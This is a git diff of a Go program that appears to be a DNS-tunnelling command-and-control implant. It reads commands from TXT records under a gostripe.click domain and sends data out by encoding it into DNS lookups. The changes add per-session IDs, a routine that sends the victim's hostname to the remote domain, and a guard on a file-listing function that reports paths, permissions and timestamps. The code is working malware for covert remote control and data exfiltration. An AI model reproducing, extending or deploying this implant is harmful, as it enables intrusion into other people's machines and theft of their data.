@@ -24,13 +24,14 @@ import (
 
 var history []string
 
-var dnsserver = "8.8.8.8"
-var dnsport = "53"
+var dnsserver = "127.0.0.1"
+var dnsport = "8888"
 var dnsfull = dnsserver + ":" + dnsport
 var cmdurl = "cmd.dns.gostripe.click"
 var baseurl = "dns.gostripe.click"
 
 var curcmd string
+var sessionID string
 
 type FileBrowser struct {
 	Files        []FileData     `json:"files"`
@@ -72,9 +73,14 @@ const (
 
 func main() {
 	rand.Seed(time.Now().UnixNano())
+
+	sessionID = randSeq(5)
+	//sessionID = base64Encode(sessionID)
+
 	curcmd = randSeq(20)
 	for {
 		sendARecordCurcmd(curcmd)
+		sendARecordHostname()
 		time.Sleep(1 * time.Second)
 		cmds := getTXTrecord()
 		for _, c := range cmds {
@@ -203,7 +209,7 @@ func sendARecordWD(rec string) {
 	encoded := base64.StdEncoding.EncodeToString([]byte(rec))
 	encoded = strings.Replace(encoded, "=", "", -1)
 
-	msg := encoded + ".working." + baseurl
+	msg := encoded + ".working." + sessionID + "." + baseurl
 	fmt.Println(msg)
 
 	r := &net.Resolver{
@@ -219,7 +225,24 @@ func sendARecordWD(rec string) {
 }
 
 func sendARecordCurcmd(rec string) {
-	msg := rec + ".current." + baseurl
+	msg := rec + ".current." + sessionID + "." + baseurl
+	fmt.Println(msg)
+
+	r := &net.Resolver{
+		PreferGo: true,
+		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
+			d := net.Dialer{
+				Timeout: time.Millisecond * time.Duration(20000),
+			}
+			return d.DialContext(ctx, network, dnsfull)
+		},
+	}
+	r.LookupHost(context.Background(), msg)
+}
+
+func sendARecordHostname() {
+	name, _ := os.Hostname()
+	msg := base64Encode(name) + ".host." + sessionID + "." + baseurl
 	fmt.Println(msg)
 
 	r := &net.Resolver{
@@ -238,7 +261,7 @@ func sendARecord(rec string, msgid string) {
 	encoded := base64.StdEncoding.EncodeToString([]byte(rec))
 	encoded = strings.Replace(encoded, "=", "", -1)
 
-	msg := encoded + "." + msgid + "." + baseurl
+	msg := encoded + "." + msgid + "." + sessionID + "." + baseurl
 
 	fmt.Println(msg)
 
@@ -264,7 +287,7 @@ func getArecord() {
 			return d.DialContext(ctx, network, dnsfull)
 		},
 	}
-	iprecords, _ := r.LookupHost(context.Background(), curcmd+"."+cmdurl)
+	iprecords, _ := r.LookupHost(context.Background(), curcmd+"."+sessionID+"."+cmdurl)
 	for _, ip := range iprecords {
 		fmt.Println(ip)
 	}
@@ -281,7 +304,7 @@ func getTXTrecord() []string {
 		},
 	}
 
-	txtrecords, _ := r.LookupTXT(context.Background(), curcmd+"."+cmdurl)
+	txtrecords, _ := r.LookupTXT(context.Background(), curcmd+"."+sessionID+"."+cmdurl)
 
 	for _, txt := range txtrecords {
 		fmt.Println(txt)
@@ -350,65 +373,80 @@ func cat(filename string) string {
 	return string(data)
 }
 
+func exists(path string) (bool, error) {
+	_, err := os.Stat(path)
+	if err == nil {
+		return true, nil
+	}
+	if os.IsNotExist(err) {
+		return false, nil
+	}
+	return false, err
+}
+
 func list(path string) []string {
-	data := []string{}
-	//var users []string
+	checkPath, _ := exists(path)
+	if checkPath {
+		data := []string{}
+		//var users []string
 
-	var e FileBrowser
-	abspath, _ := filepath.Abs(path)
-	dirInfo, err := os.Stat(abspath)
-	if err != nil {
-		fmt.Println("Error")
-	}
-	e.IsFile = !dirInfo.IsDir()
-
-	//p := FilePermission{}
-	e.Permissions.Permissions = GetPermission(dirInfo)
-	e.Filename = dirInfo.Name()
-	e.ParentPath = filepath.Dir(abspath)
-	if strings.Compare(e.ParentPath, e.Filename) == 0 {
-		e.ParentPath = ""
-	}
-	e.FileSize = dirInfo.Size()
-	e.LastModified = dirInfo.ModTime().Format(layoutStr)
-	at, err := atime.Stat(abspath)
-	if err != nil {
-		e.LastAccess = ""
-	} else {
-		e.LastAccess = at.Format(layoutStr)
-	}
-	e.Success = true
-
-	if dirInfo.IsDir() {
-		files, err := ioutil.ReadDir(abspath)
+		var e FileBrowser
+		abspath, _ := filepath.Abs(path)
+		dirInfo, err := os.Stat(abspath)
 		if err != nil {
 			fmt.Println("Error")
 		}
+		e.IsFile = !dirInfo.IsDir()
 
-		fileEntries := make([]FileData, len(files))
-		for i := 0; i < len(files); i++ {
-			fileEntries[i].IsFile = !files[i].IsDir()
-			fileEntries[i].Permissions.Permissions = GetPermission(files[i])
-			fileEntries[i].Name = files[i].Name()
-			fileEntries[i].FullName = filepath.Join(abspath, files[i].Name())
-			fileEntries[i].FileSize = files[i].Size()
-			fileEntries[i].LastModified = files[i].ModTime().Format(layoutStr)
-			at, err := atime.Stat(abspath)
-			if err != nil {
-				fileEntries[i].LastAccess = ""
-			} else {
-				fileEntries[i].LastAccess = at.Format(layoutStr)
-			}
+		//p := FilePermission{}
+		e.Permissions.Permissions = GetPermission(dirInfo)
+		e.Filename = dirInfo.Name()
+		e.ParentPath = filepath.Dir(abspath)
+		if strings.Compare(e.ParentPath, e.Filename) == 0 {
+			e.ParentPath = ""
 		}
-		e.Files = fileEntries
+		e.FileSize = dirInfo.Size()
+		e.LastModified = dirInfo.ModTime().Format(layoutStr)
+		at, err := atime.Stat(abspath)
+		if err != nil {
+			e.LastAccess = ""
+		} else {
+			e.LastAccess = at.Format(layoutStr)
+		}
+		e.Success = true
+
+		if dirInfo.IsDir() {
+			files, err := ioutil.ReadDir(abspath)
+			if err != nil {
+				fmt.Println("Error")
+			}
+
+			fileEntries := make([]FileData, len(files))
+			for i := 0; i < len(files); i++ {
+				fileEntries[i].IsFile = !files[i].IsDir()
+				fileEntries[i].Permissions.Permissions = GetPermission(files[i])
+				fileEntries[i].Name = files[i].Name()
+				fileEntries[i].FullName = filepath.Join(abspath, files[i].Name())
+				fileEntries[i].FileSize = files[i].Size()
+				fileEntries[i].LastModified = files[i].ModTime().Format(layoutStr)
+				at, err := atime.Stat(abspath)
+				if err != nil {
+					fileEntries[i].LastAccess = ""
+				} else {
+					fileEntries[i].LastAccess = at.Format(layoutStr)
+				}
+			}
+			e.Files = fileEntries
+		}
+		for _, f := range e.Files {
+			line := fmt.Sprintf("%s %s %s %s %s %s", f.FullName, f.LastAccess, f.LastModified, f.Permissions.Permissions.User, f.Permissions.Permissions.Group, f.Permissions.Permissions.Permissions)
+			data = append(data, line)
+		}
+		//header := []string{"File", "LastAccess", "LastModified", "User", "Group", "Permissions"}
+		//tables.TableData(data, header)
+		return data
 	}
-	for _, f := range e.Files {
-		line := fmt.Sprintf("%s %s %s %s %s %s", f.FullName, f.LastAccess, f.LastModified, f.Permissions.Permissions.User, f.Permissions.Permissions.Group, f.Permissions.Permissions.Permissions)
-		data = append(data, line)
-	}
-	//header := []string{"File", "LastAccess", "LastModified", "User", "Group", "Permissions"}
-	//tables.TableData(data, header)
-	return data
+	return nil
 }
 
 func GetPermission(finfo os.FileInfo) FilePermission {
